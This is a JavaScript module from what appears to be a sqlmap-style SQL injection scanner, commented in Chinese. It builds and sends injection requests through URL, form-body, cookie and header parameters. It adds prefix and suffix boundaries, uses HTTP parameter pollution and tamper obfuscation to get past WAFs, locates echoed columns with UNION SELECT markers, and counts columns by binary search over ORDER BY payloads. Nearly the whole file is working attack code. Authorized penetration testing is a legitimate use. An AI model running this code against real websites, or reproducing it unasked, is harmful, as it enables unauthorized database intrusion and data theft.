import { URL } from 'url';
import { obfuscatePayload, fillPayload } from './payloads.js';
import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';

// sqlmap 风格注入边界（--prefix / --suffix）：
// 把 prefix 精确插入原始参数值之后、技术 payload 之前，suffix 追加在末尾。
// 例：orig='1', value='1 UNION SELECT ...', prefix=')', suffix='-- -'
//   -> '1) UNION SELECT ...-- -'
// 若 value 不以原始值开头则退化为整体包裹 prefix+value+suffix。
export function applyBoundary(value, point, boundary) {
  if (!boundary) return value;
  const prefix = boundary.prefix || '';
  const suffix = boundary.suffix || '';
  if (!prefix && !suffix) return value;
  const orig = (point && point.originalValue) || '1';
  let finalVal = value;
  if (prefix && typeof value === 'string' && value.startsWith(orig) && value.length > orig.length) {
    finalVal = orig + prefix + value.slice(orig.length);
  } else {
    finalVal = prefix + value;
  }
  return finalVal + suffix;
}

// 统一的注入请求构造（url/body/cookie/header 四种注入点）
// 与 Detector.buildRequest / Extractor._build / DBFingerprinter._build 行为一致，集中维护避免三处漂移。
// 传入 ctx 时自动套用 ctx.config.injectionBoundary（--prefix/--suffix），与 sqlmap 对基线+探针一致施加。
export function buildInjectionRequest(target, point, value, ctx) {
  const boundary = ctx && ctx.config && ctx.config.injectionBoundary;
  const finalValue = applyBoundary(value, point, boundary);
  // 表单点回退：优先用表单自身的提交方法与 action 地址；否则回退到 target 默认。
  const req = {
    method: point.formMethod || target.method,
    url: point.actionUrl || target.baseUrl,
    params: {},
    data: {},
    headers: { ...(target.headerParams || {}) },
  };
  const cookies = { ...(target.cookieParams || {}) };
  if (point.location === 'url') {
    const u = new URL(req.url);
    const hpp = ctx && ctx.config && ctx.config.hpp;
    if (hpp) {
      // HTTP 参数污染：同名多值（原始值在首、注入值在末）。原始值来自目标 URL 既有同名参数
      // （取首个），或退化用 originalValue；WAF 查首值合法、后端取末值/拼接执行注入值。
      const origParam = u.searchParams.get(point.param) || point.originalValue || '1';
      u.search = ''; // 清空重建，避免污染既有其他参数
      // 保留其他参数
      for (const [k, v] of new URL(req.url).searchParams.entries()) {
        if (k !== point.param) u.searchParams.append(k, v);
      }
      u.searchParams.append(point.param, origParam); // 首值：原始合法
      u.searchParams.append(point.param, finalValue); // 末值：注入
      req.url = u.toString();
    } else {
      u.searchParams.set(point.param, finalValue);
      req.url = u.toString();
    }
  } else if (point.location === 'body') {
    // 表单点：将表单全部字段并入 data（含 CSRF token），再把当前注入参数覆盖为注入值
    const formValues = point.formValues || {};
    req.data = { ...formValues };
    req.data[point.param] = finalValue;
  } else if (point.location === 'cookie') {
    cookies[point.param] = finalValue;
    req.headers['Cookie'] = Object.entries(cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join('; ');
  } else if (point.location === 'header') {
    req.headers[point.param] = finalValue;
  }
  return req;
}

// 经统一 HttpClient 发送（失败返回 null，不让单请求错误中断提取/指纹）
export async function sendInjection(httpClient, ctx, req, opts = {}) {
  const config = (ctx && ctx.config) || {};
  try {
    return await httpClient.request({
      method: req.method,
      url: req.url,
      params: req.params,
      data: req.data,
      headers: req.headers,
      timeoutMs: opts.timeoutMs ?? config.timeoutMs,
      retry: opts.retry ?? config.retry,
      proxy: config.proxy ?? false,
      auth: config.auth ?? null,
      wafEvasion: config.wafEvasion ?? null,
    });
  } catch {
    return null;
  }
}

// 按 WAF 规避配置包裹混淆（tamper 链式优先，否则 legacy obfuscate，否则原样）
export function obfuscateIfNeeded(ctx, value) {
  return obfuscateWithConfig(value, ctx);
}

const MARKER = 'SQLISCANNER';

// 解析 --union-cols（sqlmap 风格）：返回 null（用默认枚举）/ {exact:N}（跳过枚举直接定列数）/ {min,max}（约束枚举范围）
export function resolveUnionColumns(cfg, defaultMax = 50) {
  const u = cfg && cfg.unionCols;
  if (u == null) return null;
  const s = String(u).trim();
  if (/^\d+$/.test(s)) return { exact: parseInt(s, 10) };
  const m = s.match(/^(\d+)\s*-\s*(\d+)$/);
  if (m) {
    const a = parseInt(m[1], 10);
    const b = parseInt(m[2], 10);
    return { min: Math.max(1, Math.min(a, b)), max: Math.max(a, b) };
  }
  return null; // 无法解析则忽略，退回默认枚举
}

// 在已知列数下用标记 UNION 定位可回显列（返回 0-based 索引数组）
// 提取器/指纹器复用本函数，避免各自硬编第 2 列。
// 标记基串可由 config.unionChar 覆盖（默认 SQLISCANNER），用于 --union-char 调优。
export async function discoverEchoColumns(httpClient, ctx, columns) {
  const { target, point } = ctx;
  const base = (ctx.config && ctx.config.unionChar) || MARKER;
  const markers = Array.from({ length: columns }, (_, i) => `'${base}${i}'`).join(',');
  const payload = fillPayload('{ORIG} UNION SELECT {MARKERS}', {
    orig: point.originalValue || '1',
  }).replace('{MARKERS}', markers);
  const req = buildInjectionRequest(target, point, obfuscateIfNeeded(ctx, payload), ctx);
  const res = await sendInjection(httpClient, ctx, req);
  const body = String(res?.data ?? '');
  const hits = [];
  for (let i = 0; i < columns; i++) {
    // 标记 <base><i> 由扫描器自身确定性生成；randomcase / charunicodeencode 等 tamper
    // 会改变其大小写，故做大小写不敏感匹配，避免回显标记大小写被打乱时定位回显列失败。
    if (body.toLowerCase().includes(`${base}${i}`.toLowerCase())) hits.push(i);
  }
  return hits;
}

/**
 * 二分猜测列数（ORDER BY 列数枚举）。
 *
 * 信号单调：当 ORDER BY n 的 n ≤ 真实列数时响应正常，n > 真实列数时数据库报错（status≥500）
 * 或响应骤缩（长度 < 基线 50%），据此二分查找「最大的正常 n」即为列数。
 *
 * 将指纹/UNION 检测阶段的线性扫描 O(maxCols) 降至 O(log maxCols)：maxCols=50 时 50 次 → 约 6 次，
 * 与目标列数无关，与 sqlmap 的列数枚举策略一致。Extractor.guessColumns 已用同构二分，此处统一复用。
 *
 * @param {object} httpClient 统一 HttpClient
 * @param {object} ctx { target, point, config }
 * @param {number} baseLen 基线响应体长度（用于判定骤缩）
 * @param {number} maxCols 列数上限（defaults.maxColumnsGuess）
 * @param {number} [minCols=1] 列数下限（--union-cols 范围模式下约束下限）
 * @returns {Promise<number>} ≥1 的列数
 */
export async function guessColumnsBinary(httpClient, ctx, baseLen, maxCols, minCols = 1) {
  const obf = (s) => obfuscateIfNeeded(ctx, s);
  const isAbnormal = async (n) => {
    const req = buildInjectionRequest(
      ctx.target,
      ctx.point,
      obf(`${ctx.point.originalValue || '1'} ORDER BY ${n}-- -`),
      ctx
    );
    const res = await sendInjection(httpClient, ctx, req);
    const len = String(res?.data ?? '').length;
    return res?.status >= 500 || len < baseLen * 0.5;
  };
  let lo = Math.max(1, minCols);
  let hi = maxCols;
  let ans = 0;
  while (lo <= hi) {
    const mid = Math.floor((lo + hi) / 2);
    // 正常 → 记录并尝试更大列数；异常 → 收缩上界
    if (!(await isAbnormal(mid))) {
      ans = mid;
      lo = mid + 1;
    } else {
      hi = mid - 1;
    }
  }
  return ans <= 0 ? 1 : ans;
}
